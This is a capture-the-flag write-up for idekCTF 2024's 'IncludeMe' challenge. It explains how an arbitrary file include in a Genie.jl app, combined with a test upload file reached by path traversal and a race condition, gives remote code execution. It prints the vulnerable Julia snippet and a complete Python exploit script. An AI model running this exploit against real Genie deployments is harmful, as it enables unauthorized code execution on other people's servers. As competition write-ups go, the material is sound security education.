---
id: 476adce3-c249-4a2d-ad88-ea823a5c99a1
title: Arbitrary File Inclusion Leading to RCE in Genie.jl - IncludeMe [idekCTF 2024]
created_time: 2024-08-19T00:24:00.000Z
last_edited_time: 2024-09-28T00:27:00.000Z
cover_image: ./imgs/images_CYPDSAFZ
icon_emoji: 🏎️
categories: []
verification:
  state: unverified
  verified_by: null
  date: null
page: Arbitrary File Inclusion Leading to RCE in Genie.jl - IncludeMe [idekCTF 2024]
owner:
  - object: user
    id: ee7aeeeb-cd0d-4cbb-9e7e-109320ff16fa
    name: Dimas
    avatar_url: >-
      https://s3-us-west-2.amazonaws.com/public.notion-static.com/fab4bcf0-36ea-4bd6-8847-f18b157387da/92920739.png
    type: person
    person:
      email: dimasmaulana0305@gmail.com
_thumbnail: ./imgs/images_CYPDSAFZ

---

In idekCTF 2024, I played with the **P1G SEKAI** team and secured 1st place out of 1,068 teams! I solved a challenge named "Included me" and got the first blood on that challenge.

# Challenge Description

another minimalist, frontend-less, challenge because i'm bad at writing server-side challenges

[image](https://prod-files-secure.s3.us-west-2.amazonaws.com/39d1be85-e7c6-4263-a666-a42da95a70df/709a0b78-7ae2-4171-930b-e98c753c8621/includeme.tar.gz?X-Amz-Algorithm=AWS4-HMAC-SHA256\&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD\&X-Amz-Credential=ASIAZI2LB4663HA5IOXG%2F20250523%2Fus-west-2%2Fs3%2Faws4_request\&X-Amz-Date=20250523T100951Z\&X-Amz-Expires=3600\&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDIaCXVzLXdlc3QtMiJIMEYCIQCV62P6ghwTFu0WGwEW2SHdN9qhof7pUJ14VjkyTcBoUwIhALzdA2vZ%2BGoE4v9tAyIxkl5msAqH8YFGZMymuweQhgdNKogECOv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQABoMNjM3NDIzMTgzODA1Igy3A1DjGrVnFrOVxqoq3AMHHbylMvawg%2Bmf7mnBFkFHuqySVWwHT43fIa8HILpQX2OWg%2FqR6fJOtoPomMfofnPlrKwWIOEdatu3pnUXBX8DX1bI7e6gdYZDJsAuzFmPveu%2F2laveeeqMi9GlEjAhVpiJqppNGBamLalKoukpkQK%2BNo6thJ0tcKcVAU6epaJssUslssEJZDTjVaoFL02jxRyMCRZMz0qOHVKfxd%2BhzmhsSkhnDE0p3qpiyX7%2FtePFHl0DS3s%2FDXdFA%2F%2BTaih5mY9h208hUJ6QTo%2BHW6vjZJ4hWQl2Tl7oYZd1f6uwx3TYXlSaS83HMDIPBWaA286YbW8pr%2B8EVi5U5cPEbYDwqdsyT1i8XAlQxMbhb12M01ZCZK7TjYwwq1I4AdXE6tnjR1w6M9RTegsfN7fHEV%2BpS%2Bk59MXTyzp7Xqzf7uLKkpJver%2BNAo%2FkNTgoAUIAOU5sv71CLCTm%2BZ3aZ0edoVG7nPO%2FT0r69oQdt1BszQHzBWCXdHn8uM58mJ0ydva9yusLAY%2FHn4QDfJcVwHO54y9uCLlewe1W94ZhwmaMpJo06d9jCl%2B9LDcBfXpn6Pnpapq9cRX0G90bc48HsqMs4ptOX5tD9H2cWwOtmEQTZPxGe5YoDRC1LLKTiPowuY3yjD%2BisHBBjqkAW90rUoQ%2BXoJT5Zc4aBmxgpdzJPelhFtFAJGnvElNveL03TRih1EZfFdRvFgOr67amspUBGX%2B01f4QcbsSro%2BftAqKWqGx4TwpUkp5OCSM%2FjTroR4r1U3Ieb42qAJMDdHNyQDImdUN%2BnjumPsU5q7ntFREpcFTM%2FLb1pnLWXS4s7j6Oo%2FeS75X3CwrwF6wgO8aNdWROaaIa40tsp31AdnUZ0H0VL\&X-Amz-Signature=adc6f2702ae209430f20c74f4fa6e39748f493a4a4905f0aad3bb3e1e8c5727b\&X-Amz-SignedHeaders=host\&x-id=GetObject)

# How to Solve

The goal of this challenge was to achieve Remote Code Execution (RCE) and capture the flag. The program was vulnerable to arbitrary file inclusion here:

```julia
using Genie, Genie.Requests, Pkg

Pkg.activate(".")

index() = include(params(:page, "example.jl"))

route("/", index)

up(1337, "0.0.0.0", async = false)
```

We could include arbitrary files into the application, altering its flow. I discovered that we could include a test case from this Genie.jl repository:

> [![image](./imgs/b322ed80-bc5a-11e9-807a-9b53749c40ef_ftYlQyUC) **Genie.jl/test/fileuploads/test.jl at 509886d61a75d74bcbd45db1f77230abd4cd11a8 · GenieFramework/Genie.jl**](https://github.com/GenieFramework/Genie.jl/blob/509886d61a75d74bcbd45db1f77230abd4cd11a8/test/fileuploads/test.jl#L14)\
> 🧞The highly productive Julia web framework. Contribute to GenieFramework/Genie.jl development by creating an account on GitHub.\
> <https://github.com/GenieFramework/Genie.jl/blob/509886d61a75d74bcbd45db1f77230abd4cd11a8/test/fileuploads/test.jl#L14>

This test case essentially exposes a file upload vulnerability, allowing us to upload arbitrary files into Genie. However, after including that file, the program’s flow would change, preventing us from doing it a second time… or would it? The solution is yes, we can include it again if we’re fast enough to include `app.jl` right after uploading the file. This requires a race condition. Here's my solution script:

```python
import httpx
import asyncio

URL = "http://localhost:1337"
# URL = "https://includeme-295e03fffda9795f.instancer.idek.team/"

class BaseAPI:
    def __init__(self, url=URL) -> None:
        self.c = httpx.AsyncClient(base_url=url, timeout=100)
    def page(self, page):
        return self.c.get("/", params={"page": page})
    def upload(self, fileupload):
        return self.c.post("/", files={"fileupload": ("x.jl", fileupload)})
class API(BaseAPI):
    ...

async def main():
    api = API()
    ress = []
    res1 = api.page("../home/ctf/.julia/packages/Genie/yQwwj/test/fileuploads/test.jl")
    ress.append(res1)
    for i in range(10):
        res2 = api.upload("""
read(`cat flag.txt`, String)
""")
        for j in range(10):
            res3 = api.page("app.jl")
            ress.append(res3)
        ress.extend([res1, res2])
    ress = await asyncio.gather(*ress)
    for res in ress:
        print(res.text)


if __name__ == "__main__":
    asyncio.run(main())

```

Next, visit <http://localhost:1337/?page=x.jl> to retrieve the flag.

![](./imgs/image_2FRbeU5K.png)
